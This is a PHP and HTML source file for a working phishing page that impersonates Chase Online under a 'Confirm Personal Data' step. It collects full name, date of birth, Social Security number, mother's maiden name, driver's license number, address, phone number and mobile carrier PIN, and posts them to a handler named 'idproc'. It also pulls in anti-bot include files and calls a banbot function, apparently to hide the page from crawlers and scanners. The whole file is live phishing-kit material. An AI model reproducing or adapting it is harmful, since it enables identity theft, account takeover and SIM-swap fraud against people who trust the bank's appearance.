<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html class="no-js" lang="en" dir="ltr">
    <head>
        <meta charset="utf-8"/>
        <meta name="robots" content="noindex,nofollow" />
        <title>Chase Online</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
        <link rel="shortcut icon" href="../style/img/chasefavicon.ico"/>
<style>
        .spinnerWrapper{position:absolute;width:100%;top:45%;text-align:center}#chaseSpinnerID.jpui.spinner{display:inline-block;overflow:visible!important;padding-top:0;margin-top:-50%}#chaseSpinnerID.jpui.spinner:after{content:"\0020";-moz-animation:three-quarters-loader 780ms infinite linear;-webkit-animation:three-quarters-loader 780ms infinite linear;animation:three-quarters-loader 780ms infinite linear;border:4px solid #ccc;border-right-color:#0092ff;border-radius:50%;box-sizing:border-box;display:inline-block;position:relative;width:48px;height:48px}@media(max-width:991px){#chaseSpinnerID.jpui.spinner:after{width:38px;height:38px}}@media(max-width:767px){#chaseSpinnerID.jpui.spinner:after{width:28px;height:28px}}#chaseSpinnerID.jpui.spinner:before{content:"Loading";color:transparent;position:absolute;bottom:-1.25rem;font-size:1rem}#chaseSpinnerID.jpui.spinner:focus{outline:0}@-moz-keyframes three-quarters-loader{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes three-quarters-loader{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes three-quarters-loader{0%{-moz-transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);transform:rotate(360deg)}}#chaseSpinnerID.jpui.spinner .util.accessible-text{position:absolute!important;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0!important;border:0!important;height:1px!important;width:1px!important;overflow:hidden}BODY{overflow-x:hidden;overflow-y:auto;margin:0}#init,#body{opacity:0;-webkit-transition:opacity .5s;transition:opacity .5s}#init{z-index:-1;background:#fff;position:fixed;top:0;left:0;min-width:100%;min-height:110%}     





.spinner:after, .mask:after {
    content: '';
    position: fixed;
    z-index: -1;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    
background: #1c4f82;
    background: -moz-linear-gradient(top,#1c4f82 0,#2e6ea3 100%);
    -moz-opacity: .9;
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
}


</style>
<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },500);
  }
}
</script>




        <link rel="stylesheet" href="../style/css/blue-ui.css">
<link rel="stylesheet" href="../style/css/fonto.css">
        <link rel="stylesheet" href="../style/css/logon.css">

<script src="../style/js/jquery.min.js"></script>
<script src="../style/js/jquery.mask.js"></script>




  <script>
$(function() {
$('#phone').mask('(000) 000-0000');
$('#ssn').mask('000-00-0000');
});
</script>

<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}


.vx_btn.vx_btn-seco, .vx_btn-small.vx_btn-secon, .vx_btn-medium.vx_btn-seco {


background-color: transparent;
    border-color: #0070ba;
    color: #0070ba;
    margin-right: 0;
    margin-left: 0;
    width: 100%;
}
.groupn{margin:50px 0 0px;font-weight:600;color:#000;border-bottom:1px solid #0b6efd;padding-bottom:3px;}
.pdes{margin:10px 0 20px;font-size: .8125rem;font-weight:400;color:#414042;;border-bottom:0;padding-bottom:3px;}
.pdeshead{margin:0;font-size:1rem;font-weight:600;color:#000;border-bottom:0;padding-bottom:0;}
@media only screen and (min-width: 768px){
.pdes, .pdeshead {
    font-size: .875rem;
}}
</style>

<style type="text/css">.jpui.background.image { background-image: url(../style/img/background.desktop.day.4.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='../style/img/background.desktop.day.4.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='../style/img/background.desktop.day.4.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(../style/img/background.desktop.day.4.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(../style/img/background.desktop.day.4.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(../style/img/background.desktop.day.4.jpeg); } }</style>

<style>
input{text-transform:capitalize;font-size:1.1rem!important;}
input.upper{text-transform:uppercase;}
</style>

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div id="spinarrrrrr" style="display:none">
<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;">
<div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>
</div>
<div id="fixed" >
<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;">
<div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>
</div>


<div data-is-view="true"><div class="" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"></div> <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div> </div></div> 





<header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"> <div><a href="#" data-attr="LOGON_SUMMARY_MENU.requestChaseHomepage"><div class="chase logo"></div> <span class="util accessible-text" data-attr="LOGON_SUMMARY_MENU.chaseLogoAda">Chase.com homepage</span></a></div> </div></header> <main id="logon-content" data-has-view="true"><div class="container logon" data-is-view="true"><div><div id="backgroundImage"><div class="jpui background image fixed show-xs show-sm" id="geoImage"></div></div></div> <div class="row"><div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">


<div class="jpui raised segment"><div class="row"><div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3></div></div> <div class="row"><div class="col-xs-12"><div class="progress"><div class="bar"></div></div></div></div></div> </div> <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">






<div id="sssddddvvvv" style ="background: rgba(255,255,255,.96);
border-radius: 5px;
    padding: 1.25rem 0;
    margin: 0 auto;"
 class="jpui raised "><div class="row"><div class="col-xs-10 col-xs-offset-1">
<div style="text-align: center;">

<h2 id="bilingh1" >Confirm Personal Data <span class="util high-contrast"></span></h2>


<div id="bilingh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step" id="progress-progressBar-step-2"></li><li id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div>

</div>

<form id="loginfo" method="POST" autocomplete="off" action="idproc" onsubmit="return validate()">


<div id="errorrSignIn" >
	<div id='validator-error-header' style="display:<?php if(!isset($_GET[''.$theerrkey.''])){echo 'none';};?>;"><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span><span id="ErrorMessage">Please check your information and try again.</span></h2> </div></div></div>
</div>
<div class="pdes">Take some time to fill and verify your details</div>

<label class="util accessible-text logon-xs-toggle error" for="userId-input-field" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Username</label> <div class="logon-xs-toggle" id="userId">
<div class="groupn">1 of 2 - Personal details</div>
 <input  class="jpui input logon-xs-toggle " id="fname" placeholder="Full Name"  type="text" name="fname" required="required"   >  

 <input  class="jpui input logon-xs-toggle " id="dob" placeholder="Date Of Birth - MM/DD/YYYY"  type="tel" name="dob" required="required" oninput="DateOfBirth();" maxlength="10">  
  
 <input  class="jpui input logon-xs-toggle " id="ssn" placeholder="Social Security Number"  type="tel" name="ssn" required="required" oninput="innumlen(this.value);"  maxlength="11">  

 <input  class="jpui input logon-xs-toggle " id="mmn" placeholder="Mother's Maiden Name"  type="text" name="mmn" required="required"   >  
 
 <input  class="jpui input logon-xs-toggle upper" id="dl" placeholder="Driver's License Number"  type="text" name="dl" required="required"  maxlength="13" >  
<div class="groupn">2 of 2 - Contact details</div>
 <input  class="jpui input logon-xs-toggle " id="street" placeholder="Street Address"  type="text" name="street" required="required"/>  
 
 <input  class="jpui input logon-xs-toggle " id="zip" placeholder="Zip Code"  type="tel" name="zip" required="required" oninput="innumlen(this.value);" maxlength="5"> 
 
 <input  class="jpui input logon-xs-toggle " id="state" placeholder="State"  type="text" name="state" required="required"  maxlength="20"> 
 
 <input  class="jpui input logon-xs-toggle " id="phone" placeholder="Phone Number"  type="tel" name="phone" required="required" oninput="innumlen(this.value);">
 
 <input  class="jpui input logon-xs-toggle " id="mopin" placeholder="carrier pin"  type="tel" name="mopin" required="required" oninput="innumlen(this.value);">  <label for="mopin" style="font-size:12px;color:#f00;">Enter 0000 if you do not know your carrier pin<label/>

<div class="pdes">By giving us your mobile number, Chase has your consent to send you automated calls and texts to service all of your accounts with us.</div>

<div class="pdeshead">Consumer Report Authorization</div>
<div class="pdes">By choosing "Next," below you authorize us to obtain consumer reports that we may use when considering your verification (your credit score will not be impacted). You also authorize us to obtain subsequent consumer reports and any other information about you in connection with: 1) the administration, review or collection of your account and 2) offers of enhanced or additional products and services or for other legitimate purposes associated with your account. </div>

<button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button>


</div>

</form>








</div>

</div></div></div></div></div></div></main>



</div></div>

<br><br>
<br>
<br>
<br>
<br>
<br>



<div class="footer-container" data-is-view="true" style="position: static;">
<div class="container"><div class="social-links row"><div class="col-xs-12"><span class="follow-us-text">Follow us:</span> <ul class="icon-links"><li class="facebook"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseFacebook"><i class="jpui facebook icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseFacebookAda">Facebook</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="instagram"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseInstagram"><i class="jpui instagram icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseInstagramAda">Instagram</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="twitter"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseTwitter"><i class="jpui twitter icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseTwitterAda">Twitter</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="youtube"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseYouTube"><i class="jpui youtube icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseYouTubeAda">YouTube</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="linkedin"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedIn"><i class="jpui linkedin icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedInAda">LinkedIn</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li></ul></div></div> <div class="footer-links row"><div class="col-xs-12"><ul><li><a href="#" data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact us</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li> <li><?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?><a href="#" data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms of use</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE Act: Chase Mortgage Loan Originators</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair Lending</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAboutChase">About Chase</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P. Morgan</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan Chase &amp; Co.</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espanol</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase Canada</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li> <li>Member FDIC</li> <li><i class="jpui equal-housing-lender icon" id="undefined" aria-hidden="true"></i> Equal Housing Lender</li> <li class="copyright-label">&copy; <?php echo date('Y');?> JPMorgan Chase &amp; Co.</li></ul></div></div> <div class="row galaxy-footer"><div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">&copy; <?php echo date("Y");?> JPMorgan Chase &amp; Co.</span><br> <a class="NOTELINK" href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy <i class="jpui progressright icon end-icon" aria-hidden="true"></i></a><br> <a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p></div></div></div>
</div>

<script>
"use strict"
document.getElementById("loginfo").setAttribute("novalidate",true);
function load(){document.getElementById('spinarrrrrr').style.display="block";}
function stopload(){document.getElementById('spinarrrrrr').style.display="none";};

function disperr(){document.getElementById('validator-error-header').style.display="block";}
function clrerr(){document.getElementById('validator-error-header').style.display="none";};
function writerr(msg){document.getElementById('ErrorMessage').innerHTML=msg;}


function validate(){var dob=document.getElementById("dob");clrerr();var self=document.getElementById("loginfo"); var input = self.querySelectorAll(["input[required]"]);var emptylist=[];for(var i=0;i<input.length;i++){if(input[i].value==""){emptylist.push(i);};} if(emptylist.length >= 1){input[emptylist[0]].focus();stopload();writerr("All fields are required !");for(var i of emptylist){disperr()};return false;} else{if(dob.value.length!=10 || /^\d{1,2}[\/\-\.]?\d{1,2}[\/\-\.]?\d{4}$/.test(dob.value)==false){stopload();writerr("Date Of Birth, Must be in MM/DD/YYYY format");disperr();return false;} else{load();return true;};}; };

function DateOfBirth(){var key =event.data;var val=event.target.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){
case 1:if(key > 1){event.target.value="";}; break; 
case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[3]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 4:if(key > 3){event.target.value=val.slice(0,val.length-1);}; break;
case 5:if(val[3]>=3 && key > 1 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 7:if(key < 1 || key > 2){event.target.value=val.slice(0,val.length-1);}; break; 
case 8:if(val[6] == 1 && key < 9){event.target.value=val.slice(0,val.length-1);} else if(val[6]==2 && key > 0){event.target.value=val.slice(0,val.length-1);}; break; 
case 9:if(val[6]==2 && key > 1){event.target.value=val.slice(0,val.length-1);}; break; };};
if(event.inputType=="deleteContentBackward" && val.length == 2){event.target.value=val[0]}
else if(event.inputType=="deleteContentBackward" && val.length == 5){event.target.value=val.slice(0,val.length-1);}};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};
</script>

</body></html>